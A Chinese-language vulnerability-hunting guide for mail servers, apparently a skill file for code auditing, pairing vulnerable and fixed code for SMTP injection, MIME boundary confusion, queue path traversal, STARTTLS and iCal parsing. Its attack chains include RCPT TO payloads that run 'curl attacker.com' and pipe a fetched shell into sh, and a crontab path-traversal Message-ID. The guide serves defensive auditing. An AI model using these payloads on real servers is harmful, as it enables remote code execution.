---
description: 邮件系统深度漏洞挖掘 — SMTP 命令注入、MIME 边界混淆、队列文件路径穿越、SASL 绕过、开放中继、STARTTLS 降级、附件解析器缺陷
tags: [mail, vuln-hunting, smtp-injection, mime, path-traversal, sasl, starttls, open-relay]
---

# 邮件系统漏洞挖掘 (Mail Vuln Hunter)

## 触发警觉的信号 (Triggers)

- **代码中直接对 SMTP 命令参数调用 `sprintf`/`strcat` 后传入 `popen`/`system`**——命令注入的温床
- **MIME boundary 匹配使用 `strstr()` 或 `strncmp()` 而非精确比较**——边界混淆的经典根源
- **Queue 文件构造路径中存在 `sprintf(path, "%s/%s", dir, user_input)` 模式**——路径穿越信号
- **SASL 认证成功后设置全局变量 `authenticated=1`，但 `RSET` 命令未清除该标志**——状态机幽灵
- **`STARTTLS` 响应之后仍然接受明文命令**——降级攻击窗口
- **iCal/TNEF/vCard 附件由服务器端解析并提取事件/联系人信息**——富格式解析器攻击面
- **日志中出现大量 `501 5.5.4 Syntax error in parameters` 后接异常长的参数**—— fuzzing 痕迹，提示解析边界

## 不可跳过的问题链 (Question Chain)

1. **SMTP 命令参数中的换行符（`\r\n`）是否被严格拒绝？** 如果 `RCPT TO:<user@domain\r\nMAIL FROM:<...>` 被接受，命令注入是否发生？
2. **MIME 的 boundary 参数在 Content-Type 中出现多次时，解析器取第一个还是最后一个？** 安全网关与目标 MUA 的选择是否一致？
3. **Queue 文件的文件名或子目录名是否由外部输入（如主机名、Message-ID）派生？** 这些输入是否过滤了 `../` 和空字节？
4. **STARTTLS 握手完成后，如果客户端立即发送明文 `QUIT`，服务器是拒绝还是静默接受？** 明文与加密状态之间是否存在竞态窗口？
5. **SASL 的 `AUTH` 命令在发送机制名后，如果客户端发送畸形 Base64 数据，服务器是返回 `334` 继续等待还是返回 `501` 终止？** 终止时内部缓冲区是否残留？
6. **邮件服务器是否支持 `PIPELINING`？** 如果支持，`STARTTLS` 与其他命令被同时流水线发送时，TLS 层启动前的命令是否被错误地解释为已加密？

## 攻击链闭合 (Attack Chain Closure)

**完整逻辑证明：从解析缺陷到系统控制**

### 场景 A：SMTP 命令注入 → RCE

```
攻击者控制 RCPT TO 参数内容
    → 参数中包含 " | /bin/sh -c 'curl attacker.com/$(id)' #"
    → 邮件服务器在投递时调用外部程序处理该地址（如 LDA 或过滤脚本）
        → 使用 system()/popen() 拼接命令字符串
            → 命令分隔符未被转义
                → 攻击者注入的命令在服务器端执行
                    → 远程命令执行（RCE）
```

**Invariant 失效**："邮件地址是纯数据，不会影响服务器执行流程"——当地址数据被拼接到 shell 命令时，数据变成了代码。

### 场景 B：MIME Boundary 混淆 → 安全网关绕过

```
攻击者构造 multipart 邮件，Content-Type 中声明两个 boundary
    → 安全网关解析器取第一个 boundary="gateway_boundary"
        → 网关认为附件是纯文本（无害），放行
    → 目标 MUA 解析器取最后一个 boundary="mua_boundary"
        → MUA 按第二个 boundary 解析，发现实际是 application/x-msdownload
            → 恶意附件在客户端被执行
                → 网关绕过成功
```

**Invariant 失效**："安全网关和目标客户端对同一封邮件的解析结果一致"——RFC 未规定重复参数的处理优先级，实现差异必然存在。

### 场景 C：Queue 文件路径穿越 → 任意文件写入

```
攻击者通过 SMTP 会话控制 Message-ID 头
    → Message-ID = "../../../var/spool/cron/crontab"
    → 队列管理器使用该 ID 构造队列文件路径
        → 路径穿越到系统 cron 目录
            → 邮件内容（含恶意 cron 任务）被写入 crontab 文件
                → 系统定时执行攻击者命令
                    → Root 权限命令执行
```

**Invariant 失效**："队列文件始终位于队列目录内部"——未净化的外部输入成为路径组成部分。

## 代码示例 (Code Examples)

### 漏洞模式 1：SMTP 命令注入 via RCPT TO

```python
# 脆弱代码：Python 伪代码风格的邮件投递调用
def deliver_mail(recipient, mail_body):
    # recipient 直接来自 SMTP RCPT TO 参数，未经净化
    cmd = f"/usr/lib/dovecot/deliver -d {recipient}"
    os.system(cmd)  # 危险！
    
# 攻击输入：RCPT TO:<victim@domain.com; curl attacker.com/shell | sh>
# 实际执行：/usr/lib/dovecot/deliver -d victim@domain.com; curl attacker.com/shell | sh
```

```python
# 安全代码：使用列表参数 + 严格校验
def deliver_mail_safe(recipient, mail_body):
    # 严格校验邮箱格式（RFC 5322 子集）
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', recipient):
        raise ValueError("Invalid recipient address")
    
    # 使用 subprocess 列表参数，禁止 shell 解释
    subprocess.run(
        ["/usr/lib/dovecot/deliver", "-d", recipient],
        input=mail_body.encode(),
        shell=False  # 明确禁用 shell
    )
```

### 漏洞模式 2：MIME Boundary 解析歧义

```python
# 脆弱代码：简单的 boundary 扫描
def parse_multipart(body, boundary):
    parts = []
    delimiter = f"--{boundary}".encode()
    idx = 0
    while True:
        pos = body.find(delimiter, idx)
        if pos == -1:
            break
        # 缺陷：仅查找子串，不考虑前缀匹配、空格、引号差异
        parts.append(body[idx:pos])
        idx = pos + len(delimiter)
    return parts
```

```python
# 安全代码：RFC 2046  compliant boundary 解析
def parse_multipart_safe(body, content_type):
    # 从 Content-Type 精确提取 boundary 参数
    boundary = extract_boundary_parameter(content_type)
    if not boundary or len(boundary) > 70:
        raise ValueError("Invalid boundary")
    
    # boundary 必须独占一行，前面可为空格，后面可为空格或换行
    pattern = re.compile(
        rb'\r?\n[ \t]*--' + re.escape(boundary.encode()) + rb'(--)?[ \t]*\r?\n'
    )
    
    parts = []
    last_end = 0
    for match in pattern.finditer(body):
        if last_end > 0:
            parts.append(body[last_end:match.start()])
        last_end = match.end()
        if match.group(1):  # `--boundary--` 结束标记
            break
    return parts
```

### 漏洞模式 3：STARTTLS 降级窗口

```python
# 脆弱代码：TLS 升级与命令处理竞态
class SMTPServer:
    def handle_starttls(self):
        self.send_reply("220 Ready to start TLS")
        self.upgrade_to_tls()  # 阻塞升级
        # 缺陷：升级前读取缓冲区中的命令在升级后被处理
        # 但处理逻辑未区分命令是在 TLS 内还是外接收的
        
    def process_command(self, cmd):
        # 所有命令一视同仁，没有 TLS 状态标记
        if cmd == "AUTH":
            return self.handle_auth()  # 明文阶段嗅探到的 AUTH 在 TLS 后被处理
```

```python
# 安全代码：严格隔离明文与加密会话
class SMTPServerSafe:
    def __init__(self):
        self.tls_active = False
        self.pre_tls_buffer = None
        
    def handle_starttls(self):
        self.send_reply("220 Ready to start TLS")
        # 丢弃所有明文阶段已读取但未处理的字节
        self.pre_tls_buffer = self.read_buffer
        self.read_buffer = b""
        self.upgrade_to_tls()
        self.tls_active = True
        
    def process_command(self, cmd):
        if not self.tls_active and cmd in ("AUTH", "LOGIN"):
            return "530 Must issue a STARTTLS command first"
        # ...
```

### 漏洞模式 4：iCal 附件解析器命令注入

```python
# 脆弱代码：服务器解析 iCal VALARM 触发动作
def process_ical_attachment(ical_data):
    cal = vobject.readOne(ical_data)
    for component in cal.components():
        if component.name == "VEVENT":
            for alarm in component.valarm_list:
                action = alarm.action.value
                if action == "PROCEDURE":
                    # 缺陷：直接执行 iCal 中声明的外部程序
                    executable = alarm.attach.value  # 来自邮件内容！
                    os.system(executable)
```

```python
# 安全代码：禁止危险动作，沙箱化执行
def process_ical_attachment_safe(ical_data):
    cal = vobject.readOne(ical_data)
    for component in cal.components():
        if component.name == "VEVENT":
            for alarm in component.valarm_list:
                action = alarm.action.value.upper()
                # 只允许 DISPLAY 和 EMAIL，完全禁用 PROCEDURE
                if action not in ("DISPLAY", "EMAIL"):
                    log_security_event(f"Blocked dangerous iCal action: {action}")
                    continue
                if action == "EMAIL":
                    # 使用硬编码模板，禁止从 iCal 中读取可执行路径
                    send_notification_email(component.summary.value)
```

## 高价值挖掘路径

| 挖掘路径 | 核心检查点 | 工具 / 方法 |
|---------|-----------|------------|
| SMTP 命令注入 | `RCPT TO`/`MAIL FROM` 参数是否进入 `popen`/`system` | CodeQL: `exec` 调用 + 污点追踪 |
| MIME 边界混淆 | Boundary 解析器对重复参数、空格、引号的处理 | 手工构造多态 MIME，交叉对比 |
| Queue 路径穿越 | `msg_id`/`queue_id` 是否过滤路径字符 | grep `sprintf.*%s.*%s` + 审计输入源 |
| SASL 状态残留 | `RSET`/`QUIT` 是否完全重置认证状态 | 状态机逆向，fuzz 命令序列 |
| STARTTLS 降级 | TLS 握手前后命令是否隔离 | 流水线发送 `STARTTLS\r\nAUTH...`，观察响应 |
| 开放中继 | 非认证用户向外部域投递是否被阻止 | `swaks --to external@gmail.com --server target` |
| iCal/TNEF 漏洞 | 附件解析是否调用外部程序或存在内存操作 | 逆向解析库，fuzz 畸形附件 |
